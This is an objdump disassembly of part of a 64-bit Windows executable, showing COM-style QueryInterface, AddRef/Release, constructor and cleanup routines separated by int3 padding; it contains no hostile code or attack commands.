   14000416f:	cc                   	int3
   140004170:	48 8b 09             	mov    (%rcx),%rcx
   140004173:	48 ff 25 86 d2 01 00 	rex.W jmp *0x1d286(%rip)        # 0x140021400
   14000417a:	cc                   	int3
   14000417b:	cc                   	int3
   14000417c:	cc                   	int3
   14000417d:	cc                   	int3
   14000417e:	cc                   	int3
   14000417f:	cc                   	int3
   140004180:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004185:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000418a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000418f:	41 54                	push   %r12
   140004191:	48 83 ec 20          	sub    $0x20,%rsp
   140004195:	48 85 c9             	test   %rcx,%rcx
   140004198:	49 8b e9             	mov    %r9,%rbp
   14000419b:	49 8b f8             	mov    %r8,%rdi
   14000419e:	48 8b da             	mov    %rdx,%rbx
   1400041a1:	4c 8b e1             	mov    %rcx,%r12
   1400041a4:	0f 84 fd 00 00 00    	je     0x1400042a7
   1400041aa:	48 85 d2             	test   %rdx,%rdx
   1400041ad:	0f 84 f4 00 00 00    	je     0x1400042a7
   1400041b3:	4d 85 c9             	test   %r9,%r9
   1400041b6:	75 0a                	jne    0x1400041c2
   1400041b8:	b8 03 40 00 80       	mov    $0x80004003,%eax
   1400041bd:	e9 b6 00 00 00       	jmp    0x140004278
   1400041c2:	49 c7 01 00 00 00 00 	movq   $0x0,(%r9)
   1400041c9:	41 83 38 00          	cmpl   $0x0,(%r8)
   1400041cd:	75 34                	jne    0x140004203
   1400041cf:	41 83 78 04 00       	cmpl   $0x0,0x4(%r8)
   1400041d4:	75 2d                	jne    0x140004203
   1400041d6:	41 81 78 08 c0 00 00 	cmpl   $0xc0,0x8(%r8)
   1400041dd:	00 
   1400041de:	75 23                	jne    0x140004203
   1400041e0:	41 81 78 0c 00 00 00 	cmpl   $0x46000000,0xc(%r8)
   1400041e7:	46 
   1400041e8:	75 19                	jne    0x140004203
   1400041ea:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400041ee:	48 8d 1c 01          	lea    (%rcx,%rax,1),%rbx
   1400041f2:	48 8b cb             	mov    %rbx,%rcx
   1400041f5:	48 8b 03             	mov    (%rbx),%rax
   1400041f8:	ff 50 08             	call   *0x8(%rax)
   1400041fb:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   1400041ff:	33 c0                	xor    %eax,%eax
   140004201:	eb 75                	jmp    0x140004278
   140004203:	4c 8b 52 10          	mov    0x10(%rdx),%r10
   140004207:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000420c:	4d 85 d2             	test   %r10,%r10
   14000420f:	74 5d                	je     0x14000426e
   140004211:	48 8b 0b             	mov    (%rbx),%rcx
   140004214:	33 f6                	xor    %esi,%esi
   140004216:	48 85 c9             	test   %rcx,%rcx
   140004219:	40 0f 94 c6          	sete   %sil
   14000421d:	85 f6                	test   %esi,%esi
   14000421f:	75 1e                	jne    0x14000423f
   140004221:	8b 07                	mov    (%rdi),%eax
   140004223:	39 01                	cmp    %eax,(%rcx)
   140004225:	75 3a                	jne    0x140004261
   140004227:	8b 47 04             	mov    0x4(%rdi),%eax
   14000422a:	39 41 04             	cmp    %eax,0x4(%rcx)
   14000422d:	75 32                	jne    0x140004261
   14000422f:	8b 47 08             	mov    0x8(%rdi),%eax
   140004232:	39 41 08             	cmp    %eax,0x8(%rcx)
   140004235:	75 2a                	jne    0x140004261
   140004237:	8b 47 0c             	mov    0xc(%rdi),%eax
   14000423a:	39 41 0c             	cmp    %eax,0xc(%rcx)
   14000423d:	75 22                	jne    0x140004261
   14000423f:	49 83 fa 01          	cmp    $0x1,%r10
   140004243:	74 49                	je     0x14000428e
   140004245:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140004249:	4c 8b c5             	mov    %rbp,%r8
   14000424c:	48 8b d7             	mov    %rdi,%rdx
   14000424f:	49 8b cc             	mov    %r12,%rcx
   140004252:	41 ff d2             	call   *%r10
   140004255:	85 c0                	test   %eax,%eax
   140004257:	74 1a                	je     0x140004273
   140004259:	85 f6                	test   %esi,%esi
   14000425b:	75 04                	jne    0x140004261
   14000425d:	85 c0                	test   %eax,%eax
   14000425f:	78 12                	js     0x140004273
   140004261:	4c 8b 53 28          	mov    0x28(%rbx),%r10
   140004265:	48 83 c3 18          	add    $0x18,%rbx
   140004269:	4d 85 d2             	test   %r10,%r10
   14000426c:	75 a3                	jne    0x140004211
   14000426e:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140004273:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140004278:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000427d:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140004282:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140004287:	48 83 c4 20          	add    $0x20,%rsp
   14000428b:	41 5c                	pop    %r12
   14000428d:	c3                   	ret
   14000428e:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004292:	49 8d 1c 04          	lea    (%r12,%rax,1),%rbx
   140004296:	48 8b cb             	mov    %rbx,%rcx
   140004299:	48 8b 03             	mov    (%rbx),%rax
   14000429c:	ff 50 08             	call   *0x8(%rax)
   14000429f:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   1400042a3:	33 c0                	xor    %eax,%eax
   1400042a5:	eb cc                	jmp    0x140004273
   1400042a7:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400042ac:	eb ca                	jmp    0x140004278
   1400042ae:	cc                   	int3
   1400042af:	cc                   	int3
   1400042b0:	33 c0                	xor    %eax,%eax
   1400042b2:	c7 41 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rcx)
   1400042b9:	48 89 01             	mov    %rax,(%rcx)
   1400042bc:	89 41 08             	mov    %eax,0x8(%rcx)
   1400042bf:	48 8b c1             	mov    %rcx,%rax
   1400042c2:	c3                   	ret
   1400042c3:	cc                   	int3
   1400042c4:	cc                   	int3
   1400042c5:	cc                   	int3
   1400042c6:	cc                   	int3
   1400042c7:	cc                   	int3
   1400042c8:	cc                   	int3
   1400042c9:	cc                   	int3
   1400042ca:	cc                   	int3
   1400042cb:	cc                   	int3
   1400042cc:	cc                   	int3
   1400042cd:	cc                   	int3
   1400042ce:	cc                   	int3
   1400042cf:	cc                   	int3
   1400042d0:	40 53                	rex push %rbx
   1400042d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400042d6:	48 83 39 00          	cmpq   $0x0,(%rcx)
   1400042da:	48 8b d9             	mov    %rcx,%rbx
   1400042dd:	74 15                	je     0x1400042f4
   1400042df:	90                   	nop
   1400042e0:	48 8b 0b             	mov    (%rbx),%rcx
   1400042e3:	48 8b 01             	mov    (%rcx),%rax
   1400042e6:	48 89 03             	mov    %rax,(%rbx)
   1400042e9:	e8 02 eb 00 00       	call   0x140012df0
   1400042ee:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   1400042f2:	75 ec                	jne    0x1400042e0
   1400042f4:	48 83 c4 20          	add    $0x20,%rsp
   1400042f8:	5b                   	pop    %rbx
   1400042f9:	c3                   	ret
   1400042fa:	cc                   	int3
   1400042fb:	cc                   	int3
   1400042fc:	cc                   	int3
   1400042fd:	cc                   	int3
   1400042fe:	cc                   	int3
   1400042ff:	cc                   	int3
   140004300:	48 83 ec 18          	sub    $0x18,%rsp
   140004304:	8b 05 f6 c5 02 00    	mov    0x2c5f6(%rip),%eax        # 0x140030900
   14000430a:	a8 01                	test   $0x1,%al
   14000430c:	0f 85 de 00 00 00    	jne    0x1400043f0
   140004312:	83 c8 01             	or     $0x1,%eax
   140004315:	45 33 c0             	xor    %r8d,%r8d
   140004318:	48 8d 15 e1 ec ff ff 	lea    -0x131f(%rip),%rdx        # 0x140003000
   14000431f:	89 05 db c5 02 00    	mov    %eax,0x2c5db(%rip)        # 0x140030900
   140004325:	44 89 44 24 08       	mov    %r8d,0x8(%rsp)
   14000432a:	48 8d 0c 24          	lea    (%rsp),%rcx
   14000432e:	48 8d 05 4b fd ff ff 	lea    -0x2b5(%rip),%rax        # 0x140004080
   140004335:	48 89 04 24          	mov    %rax,(%rsp)
   140004339:	48 8b 01             	mov    (%rcx),%rax
   14000433c:	48 89 82 18 a3 02 00 	mov    %rax,0x2a318(%rdx)
   140004343:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140004347:	44 89 44 24 08       	mov    %r8d,0x8(%rsp)
   14000434c:	48 89 82 20 a3 02 00 	mov    %rax,0x2a320(%rdx)
   140004353:	4c 89 05 ce 8f 02 00 	mov    %r8,0x28fce(%rip)        # 0x14002d328
   14000435a:	44 89 05 cf 8f 02 00 	mov    %r8d,0x28fcf(%rip)        # 0x14002d330
   140004361:	44 89 05 d8 8f 02 00 	mov    %r8d,0x28fd8(%rip)        # 0x14002d340
   140004368:	c7 05 d2 8f 02 00 fd 	movl   $0xfd,0x28fd2(%rip)        # 0x14002d344
   14000436f:	00 00 00 
   140004372:	48 8d 0c 24          	lea    (%rsp),%rcx
   140004376:	48 8d 05 1b f0 01 00 	lea    0x1f01b(%rip),%rax        # 0x140023398
   14000437d:	48 89 05 b4 8f 02 00 	mov    %rax,0x28fb4(%rip)        # 0x14002d338
   140004384:	48 8d 05 05 fd ff ff 	lea    -0x2fb(%rip),%rax        # 0x140004090
   14000438b:	48 89 04 24          	mov    %rax,(%rsp)
   14000438f:	48 8b 01             	mov    (%rcx),%rax
   140004392:	48 89 82 48 a3 02 00 	mov    %rax,0x2a348(%rdx)
   140004399:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000439d:	48 8d 0c 24          	lea    (%rsp),%rcx
   1400043a1:	48 89 82 50 a3 02 00 	mov    %rax,0x2a350(%rdx)
   1400043a8:	4c 89 04 24          	mov    %r8,(%rsp)
   1400043ac:	44 89 44 24 08       	mov    %r8d,0x8(%rsp)
   1400043b1:	48 8b 01             	mov    (%rcx),%rax
   1400043b4:	4c 89 05 9d 8f 02 00 	mov    %r8,0x28f9d(%rip)        # 0x14002d358
   1400043bb:	44 89 05 9e 8f 02 00 	mov    %r8d,0x28f9e(%rip)        # 0x14002d360
   1400043c2:	4c 89 05 9f 8f 02 00 	mov    %r8,0x28f9f(%rip)        # 0x14002d368
   1400043c9:	44 89 05 a0 8f 02 00 	mov    %r8d,0x28fa0(%rip)        # 0x14002d370
   1400043d0:	44 89 05 9d 8f 02 00 	mov    %r8d,0x28f9d(%rip)        # 0x14002d374
   1400043d7:	48 89 82 78 a3 02 00 	mov    %rax,0x2a378(%rdx)
   1400043de:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1400043e2:	48 89 82 80 a3 02 00 	mov    %rax,0x2a380(%rdx)
   1400043e9:	4c 89 05 98 8f 02 00 	mov    %r8,0x28f98(%rip)        # 0x14002d388
   1400043f0:	48 8d 05 09 8f 02 00 	lea    0x28f09(%rip),%rax        # 0x14002d300
   1400043f7:	48 83 c4 18          	add    $0x18,%rsp
   1400043fb:	c3                   	ret
   1400043fc:	cc                   	int3
   1400043fd:	cc                   	int3
   1400043fe:	cc                   	int3
   1400043ff:	cc                   	int3
   140004400:	48 83 ec 28          	sub    $0x28,%rsp
   140004404:	48 8b 09             	mov    (%rcx),%rcx
   140004407:	48 85 c9             	test   %rcx,%rcx
   14000440a:	74 06                	je     0x140004412
   14000440c:	48 8b 01             	mov    (%rcx),%rax
   14000440f:	ff 50 10             	call   *0x10(%rax)
   140004412:	48 83 c4 28          	add    $0x28,%rsp
   140004416:	c3                   	ret
   140004417:	cc                   	int3
   140004418:	cc                   	int3
   140004419:	cc                   	int3
   14000441a:	cc                   	int3
   14000441b:	cc                   	int3
   14000441c:	cc                   	int3
   14000441d:	cc                   	int3
   14000441e:	cc                   	int3
   14000441f:	cc                   	int3
   140004420:	48 83 ec 28          	sub    $0x28,%rsp
   140004424:	48 8b 09             	mov    (%rcx),%rcx
   140004427:	48 85 c9             	test   %rcx,%rcx
   14000442a:	74 06                	je     0x140004432
   14000442c:	48 8b 01             	mov    (%rcx),%rax
   14000442f:	ff 50 10             	call   *0x10(%rax)
   140004432:	48 83 c4 28          	add    $0x28,%rsp
   140004436:	c3                   	ret
   140004437:	cc                   	int3
   140004438:	cc                   	int3
   140004439:	cc                   	int3
   14000443a:	cc                   	int3
   14000443b:	cc                   	int3
   14000443c:	cc                   	int3
   14000443d:	cc                   	int3
   14000443e:	cc                   	int3
   14000443f:	cc                   	int3
   140004440:	48 83 ec 28          	sub    $0x28,%rsp
   140004444:	48 8b 09             	mov    (%rcx),%rcx
   140004447:	48 85 c9             	test   %rcx,%rcx
   14000444a:	74 06                	je     0x140004452
   14000444c:	48 8b 01             	mov    (%rcx),%rax
   14000444f:	ff 50 10             	call   *0x10(%rax)
   140004452:	48 83 c4 28          	add    $0x28,%rsp
   140004456:	c3                   	ret
   140004457:	cc                   	int3
   140004458:	cc                   	int3
   140004459:	cc                   	int3
   14000445a:	cc                   	int3
   14000445b:	cc                   	int3
   14000445c:	cc                   	int3
   14000445d:	cc                   	int3
   14000445e:	cc                   	int3
   14000445f:	cc                   	int3
   140004460:	48 83 ec 28          	sub    $0x28,%rsp
   140004464:	48 8b 09             	mov    (%rcx),%rcx
   140004467:	48 85 c9             	test   %rcx,%rcx
   14000446a:	74 06                	je     0x140004472
   14000446c:	48 8b 01             	mov    (%rcx),%rax
   14000446f:	ff 50 10             	call   *0x10(%rax)
   140004472:	48 83 c4 28          	add    $0x28,%rsp
   140004476:	c3                   	ret
   140004477:	cc                   	int3
   140004478:	cc                   	int3
   140004479:	cc                   	int3
   14000447a:	cc                   	int3
   14000447b:	cc                   	int3
   14000447c:	cc                   	int3
   14000447d:	cc                   	int3
   14000447e:	cc                   	int3
   14000447f:	cc                   	int3
   140004480:	48 83 ec 28          	sub    $0x28,%rsp
   140004484:	4d 85 c0             	test   %r8,%r8
   140004487:	4c 8b c9             	mov    %rcx,%r9
   14000448a:	75 0a                	jne    0x140004496
   14000448c:	b8 03 40 00 80       	mov    $0x80004003,%eax
   140004491:	48 83 c4 28          	add    $0x28,%rsp
   140004495:	c3                   	ret
   140004496:	49 c7 00 00 00 00 00 	movq   $0x0,(%r8)
   14000449d:	8b 0a                	mov    (%rdx),%ecx
   14000449f:	3b 0d 13 ef 01 00    	cmp    0x1ef13(%rip),%ecx        # 0x1400233b8
   1400044a5:	75 25                	jne    0x1400044cc
   1400044a7:	8b 05 0f ef 01 00    	mov    0x1ef0f(%rip),%eax        # 0x1400233bc
   1400044ad:	39 42 04             	cmp    %eax,0x4(%rdx)
   1400044b0:	75 1a                	jne    0x1400044cc
   1400044b2:	8b 05 08 ef 01 00    	mov    0x1ef08(%rip),%eax        # 0x1400233c0
   1400044b8:	39 42 08             	cmp    %eax,0x8(%rdx)
   1400044bb:	75 0f                	jne    0x1400044cc
   1400044bd:	8b 05 01 ef 01 00    	mov    0x1ef01(%rip),%eax        # 0x1400233c4
   1400044c3:	39 42 0c             	cmp    %eax,0xc(%rdx)
   1400044c6:	0f 84 a1 00 00 00    	je     0x14000456d
   1400044cc:	3b 0d c6 ee 01 00    	cmp    0x1eec6(%rip),%ecx        # 0x140023398
   1400044d2:	75 21                	jne    0x1400044f5
   1400044d4:	8b 05 c2 ee 01 00    	mov    0x1eec2(%rip),%eax        # 0x14002339c
   1400044da:	39 42 04             	cmp    %eax,0x4(%rdx)
   1400044dd:	75 16                	jne    0x1400044f5
   1400044df:	8b 05 bb ee 01 00    	mov    0x1eebb(%rip),%eax        # 0x1400233a0
   1400044e5:	39 42 08             	cmp    %eax,0x8(%rdx)
   1400044e8:	75 0b                	jne    0x1400044f5
   1400044ea:	8b 05 b4 ee 01 00    	mov    0x1eeb4(%rip),%eax        # 0x1400233a4
   1400044f0:	39 42 0c             	cmp    %eax,0xc(%rdx)
   1400044f3:	74 65                	je     0x14000455a
   1400044f5:	85 c9                	test   %ecx,%ecx
   1400044f7:	75 17                	jne    0x140004510
   1400044f9:	39 4a 04             	cmp    %ecx,0x4(%rdx)
   1400044fc:	75 12                	jne    0x140004510
   1400044fe:	81 7a 08 c0 00 00 00 	cmpl   $0xc0,0x8(%rdx)
   140004505:	75 09                	jne    0x140004510
   140004507:	81 7a 0c 00 00 00 46 	cmpl   $0x46000000,0xc(%rdx)
   14000450e:	74 4a                	je     0x14000455a
   140004510:	81 f9 00 04 02 00    	cmp    $0x20400,%ecx
   140004516:	75 21                	jne    0x140004539
   140004518:	8b 05 2e d5 01 00    	mov    0x1d52e(%rip),%eax        # 0x140021a4c
   14000451e:	39 42 04             	cmp    %eax,0x4(%rdx)
   140004521:	75 16                	jne    0x140004539
   140004523:	8b 05 27 d5 01 00    	mov    0x1d527(%rip),%eax        # 0x140021a50
   140004529:	39 42 08             	cmp    %eax,0x8(%rdx)
   14000452c:	75 0b                	jne    0x140004539
   14000452e:	8b 05 20 d5 01 00    	mov    0x1d520(%rip),%eax        # 0x140021a54
   140004534:	39 42 0c             	cmp    %eax,0xc(%rdx)
   140004537:	74 21                	je     0x14000455a
   140004539:	41 3b 49 18          	cmp    0x18(%r9),%ecx
   14000453d:	75 2e                	jne    0x14000456d
   14000453f:	41 8b 41 1c          	mov    0x1c(%r9),%eax
   140004543:	39 42 04             	cmp    %eax,0x4(%rdx)
   140004546:	75 25                	jne    0x14000456d
   140004548:	41 8b 41 20          	mov    0x20(%r9),%eax
   14000454c:	39 42 08             	cmp    %eax,0x8(%rdx)
   14000454f:	75 1c                	jne    0x14000456d
   140004551:	41 8b 41 24          	mov    0x24(%r9),%eax
   140004555:	39 42 0c             	cmp    %eax,0xc(%rdx)
   140004558:	75 13                	jne    0x14000456d
   14000455a:	4d 89 08             	mov    %r9,(%r8)
   14000455d:	49 8b 01             	mov    (%r9),%rax
   140004560:	49 8b c9             	mov    %r9,%rcx
   140004563:	ff 50 08             	call   *0x8(%rax)
   140004566:	33 c0                	xor    %eax,%eax
   140004568:	48 83 c4 28          	add    $0x28,%rsp
   14000456c:	c3                   	ret
   14000456d:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140004572:	48 83 c4 28          	add    $0x28,%rsp
   140004576:	c3                   	ret
   140004577:	cc                   	int3
   140004578:	cc                   	int3
   140004579:	cc                   	int3
   14000457a:	cc                   	int3
   14000457b:	cc                   	int3
   14000457c:	cc                   	int3
   14000457d:	cc                   	int3
   14000457e:	cc                   	int3
   14000457f:	cc                   	int3
   140004580:	83 41 30 01          	addl   $0x1,0x30(%rcx)
   140004584:	8b 41 30             	mov    0x30(%rcx),%eax
   140004587:	c3                   	ret
   140004588:	cc                   	int3
   140004589:	cc                   	int3
   14000458a:	cc                   	int3
   14000458b:	cc                   	int3
   14000458c:	cc                   	int3
   14000458d:	cc                   	int3
   14000458e:	cc                   	int3
   14000458f:	cc                   	int3
   140004590:	40 53                	rex push %rbx
   140004592:	48 83 ec 20          	sub    $0x20,%rsp
   140004596:	83 41 30 ff          	addl   $0xffffffff,0x30(%rcx)
   14000459a:	8b 59 30             	mov    0x30(%rcx),%ebx
   14000459d:	75 11                	jne    0x1400045b0
   14000459f:	48 85 c9             	test   %rcx,%rcx
   1400045a2:	74 0c                	je     0x1400045b0
   1400045a4:	4c 8b 01             	mov    (%rcx),%r8
   1400045a7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400045ac:	41 ff 50 60          	call   *0x60(%r8)
   1400045b0:	8b c3                	mov    %ebx,%eax
   1400045b2:	48 83 c4 20          	add    $0x20,%rsp
   1400045b6:	5b                   	pop    %rbx
   1400045b7:	c3                   	ret
   1400045b8:	cc                   	int3
   1400045b9:	cc                   	int3
   1400045ba:	cc                   	int3
   1400045bb:	cc                   	int3
   1400045bc:	cc                   	int3
   1400045bd:	cc                   	int3
   1400045be:	cc                   	int3
   1400045bf:	cc                   	int3
   1400045c0:	4d 8b c8             	mov    %r8,%r9
   1400045c3:	4c 8b c2             	mov    %rdx,%r8
   1400045c6:	48 8d 15 03 d4 01 00 	lea    0x1d403(%rip),%rdx        # 0x1400219d0
   1400045cd:	e9 ae fb ff ff       	jmp    0x140004180
   1400045d2:	cc                   	int3
   1400045d3:	cc                   	int3
   1400045d4:	cc                   	int3
   1400045d5:	cc                   	int3
   1400045d6:	cc                   	int3
   1400045d7:	cc                   	int3
   1400045d8:	cc                   	int3
   1400045d9:	cc                   	int3
   1400045da:	cc                   	int3
   1400045db:	cc                   	int3
   1400045dc:	cc                   	int3
   1400045dd:	cc                   	int3
   1400045de:	cc                   	int3
   1400045df:	cc                   	int3
   1400045e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400045e5:	57                   	push   %rdi
   1400045e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400045ea:	c7 41 30 01 00 00 c0 	movl   $0xc0000001,0x30(%rcx)
   1400045f1:	48 8d 05 70 d3 01 00 	lea    0x1d370(%rip),%rax        # 0x140021968
   1400045f8:	48 8b f9             	mov    %rcx,%rdi
   1400045fb:	48 89 01             	mov    %rax,(%rcx)
   1400045fe:	48 8b 0d d3 c2 02 00 	mov    0x2c2d3(%rip),%rcx        # 0x1400308d8
   140004605:	8b da                	mov    %edx,%ebx
   140004607:	48 8b 01             	mov    (%rcx),%rax
   14000460a:	ff 50 10             	call   *0x10(%rax)
   14000460d:	48 8b cf             	mov    %rdi,%rcx
   140004610:	e8 1b e1 00 00       	call   0x140012730
   140004615:	f6 c3 01             	test   $0x1,%bl
   140004618:	74 08                	je     0x140004622
   14000461a:	48 8b cf             	mov    %rdi,%rcx
   14000461d:	e8 4e e7 00 00       	call   0x140012d70
   140004622:	48 8b c7             	mov    %rdi,%rax
   140004625:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000462a:	48 83 c4 20          	add    $0x20,%rsp
   14000462e:	5f                   	pop    %rdi
   14000462f:	c3                   	ret
   140004630:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004635:	56                   	push   %rsi
   140004636:	57                   	push   %rdi
   140004637:	41 54                	push   %r12
   140004639:	48 83 ec 30          	sub    $0x30,%rsp
   14000463d:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140004644:	ff ff 
   140004646:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   14000464b:	48 8b f9             	mov    %rcx,%rdi
   14000464e:	48 85 c9             	test   %rcx,%rcx
   140004651:	75 07                	jne    0x14000465a
   140004653:	b8 03 40 00 80       	mov    $0x80004003,%eax
   140004658:	eb 73                	jmp    0x1400046cd
   14000465a:	33 f6                	xor    %esi,%esi
   14000465c:	48 89 31             	mov    %rsi,(%rcx)
   14000465f:	41 bc 0e 00 07 80    	mov    $0x8007000e,%r12d
   140004665:	44 89 64 24 58       	mov    %r12d,0x58(%rsp)
   14000466a:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   14000466f:	8d 4e 48             	lea    0x48(%rsi),%ecx
   140004672:	e8 f9 f1 00 00       	call   0x140013870
   140004677:	48 8b d8             	mov    %rax,%rbx
   14000467a:	48 85 c0             	test   %rax,%rax
   14000467d:	74 26                	je     0x1400046a5
   14000467f:	48 8b c8             	mov    %rax,%rcx
   140004682:	e8 d9 df 00 00       	call   0x140012660
   140004687:	4c 8d 1d da d2 01 00 	lea    0x1d2da(%rip),%r11        # 0x140021968
   14000468e:	4c 89 1b             	mov    %r11,(%rbx)
   140004691:	48 8b 0d 40 c2 02 00 	mov    0x2c240(%rip),%rcx        # 0x1400308d8
   140004698:	48 8b 11             	mov    (%rcx),%rdx
   14000469b:	ff 52 08             	call   *0x8(%rdx)
   14000469e:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   1400046a3:	eb 08                	jmp    0x1400046ad
   1400046a5:	48 8b de             	mov    %rsi,%rbx
   1400046a8:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   1400046ad:	eb 11                	jmp    0x1400046c0
   1400046af:	33 f6                	xor    %esi,%esi
   1400046b1:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400046b6:	44 8b 64 24 58       	mov    0x58(%rsp),%r12d
   1400046bb:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400046c0:	48 85 db             	test   %rbx,%rbx
   1400046c3:	44 0f 45 e6          	cmovne %esi,%r12d
   1400046c7:	48 89 1f             	mov    %rbx,(%rdi)
   1400046ca:	41 8b c4             	mov    %r12d,%eax
   1400046cd:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400046d2:	48 83 c4 30          	add    $0x30,%rsp
   1400046d6:	41 5c                	pop    %r12
   1400046d8:	5f                   	pop    %rdi
   1400046d9:	5e                   	pop    %rsi
   1400046da:	c3                   	ret
   1400046db:	cc                   	int3
   1400046dc:	cc                   	int3
   1400046dd:	cc                   	int3
   1400046de:	cc                   	int3
   1400046df:	cc                   	int3
   1400046e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400046e5:	55                   	push   %rbp
   1400046e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400046ea:	48 8b ea             	mov    %rdx,%rbp
   1400046ed:	48 8d 05 bb ff ff ff 	lea    -0x45(%rip),%rax        # 0x1400046af
   1400046f4:	eb 00                	jmp    0x1400046f6
   1400046f6:	48 83 c4 20          	add    $0x20,%rsp
   1400046fa:	5d                   	pop    %rbp
   1400046fb:	c3                   	ret
   1400046fc:	cc                   	int3
   1400046fd:	cc                   	int3
   1400046fe:	cc                   	int3
   1400046ff:	cc                   	int3
   140004700:	48 83 ec 28          	sub    $0x28,%rsp
   140004704:	48 8b 09             	mov    (%rcx),%rcx
   140004707:	48 85 c9             	test   %rcx,%rcx
   14000470a:	74 06                	je     0x140004712
   14000470c:	48 8b 01             	mov    (%rcx),%rax
   14000470f:	ff 50 10             	call   *0x10(%rax)
   140004712:	48 83 c4 28          	add    $0x28,%rsp
   140004716:	c3                   	ret
   140004717:	cc                   	int3
   140004718:	cc                   	int3
   140004719:	cc                   	int3
   14000471a:	cc                   	int3
   14000471b:	cc                   	int3
   14000471c:	cc                   	int3
   14000471d:	cc                   	int3
   14000471e:	cc                   	int3
   14000471f:	cc                   	int3
   140004720:	48 ff 25 c9 cc 01 00 	rex.W jmp *0x1ccc9(%rip)        # 0x1400213f0
   140004727:	cc                   	int3
   140004728:	cc                   	int3
   140004729:	cc                   	int3
   14000472a:	cc                   	int3
   14000472b:	cc                   	int3
   14000472c:	cc                   	int3
   14000472d:	cc                   	int3
   14000472e:	cc                   	int3
   14000472f:	cc                   	int3
   140004730:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004735:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000473a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000473f:	41 54                	push   %r12
   140004741:	48 83 ec 20          	sub    $0x20,%rsp
   140004745:	48 8b 59 48          	mov    0x48(%rcx),%rbx
   140004749:	45 33 e4             	xor    %r12d,%r12d
   14000474c:	48 8b e9             	mov    %rcx,%rbp
   14000474f:	48 85 db             	test   %rbx,%rbx
   140004752:	74 2d                	je     0x140004781
   140004754:	4c 39 23             	cmp    %r12,(%rbx)
   140004757:	74 28                	je     0x140004781
   140004759:	66 66 90             	data16 xchg %ax,%ax
   14000475c:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004760:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140004764:	48 85 c9             	test   %rcx,%rcx
   140004767:	74 06                	je     0x14000476f
   140004769:	48 8b 01             	mov    (%rcx),%rax
   14000476c:	ff 50 10             	call   *0x10(%rax)
   14000476f:	33 c9                	xor    %ecx,%ecx
   140004771:	4c 89 63 20          	mov    %r12,0x20(%rbx)
   140004775:	ff 53 40             	call   *0x40(%rbx)
   140004778:	48 83 c3 48          	add    $0x48,%rbx
   14000477c:	4c 39 23             	cmp    %r12,(%rbx)
   14000477f:	75 df                	jne    0x140004760
   140004781:	48 8b 1d 38 c2 02 00 	mov    0x2c238(%rip),%rbx        # 0x1400309c0
   140004788:	48 8b 0d 39 c2 02 00 	mov    0x2c239(%rip),%rcx        # 0x1400309c8
   14000478f:	48 3b d9             	cmp    %rcx,%rbx
   140004792:	73 1d                	jae    0x1400047b1
   140004794:	48 8b 03             	mov    (%rbx),%rax
   140004797:	48 85 c0             	test   %rax,%rax
   14000479a:	74 0c                	je     0x1400047a8
   14000479c:	33 c9                	xor    %ecx,%ecx
   14000479e:	ff 50 40             	call   *0x40(%rax)
   1400047a1:	48 8b 0d 20 c2 02 00 	mov    0x2c220(%rip),%rcx        # 0x1400309c8
   1400047a8:	48 83 c3 08          	add    $0x8,%rbx
   1400047ac:	48 3b d9             	cmp    %rcx,%rbx
   1400047af:	72 e3                	jb     0x140004794
   1400047b1:	44 39 65 08          	cmp    %r12d,0x8(%rbp)
   1400047b5:	48 8d 7d 08          	lea    0x8(%rbp),%rdi
   1400047b9:	74 78                	je     0x140004833
   1400047bb:	4c 39 65 10          	cmp    %r12,0x10(%rbp)
   1400047bf:	74 56                	je     0x140004817
   1400047c1:	48 85 ff             	test   %rdi,%rdi
   1400047c4:	75 15                	jne    0x1400047db
   1400047c6:	8d 57 01             	lea    0x1(%rdi),%edx
   1400047c9:	45 33 c9             	xor    %r9d,%r9d
   1400047cc:	45 33 c0             	xor    %r8d,%r8d
   1400047cf:	b9 05 00 00 c0       	mov    $0xc0000005,%ecx
   1400047d4:	ff 15 d6 ca 01 00    	call   *0x1cad6(%rip)        # 0x1400212b0
   1400047da:	cc                   	int3
   1400047db:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400047e0:	48 8b 77 08          	mov    0x8(%rdi),%rsi
   1400047e4:	48 85 f6             	test   %rsi,%rsi
   1400047e7:	74 21                	je     0x14000480a
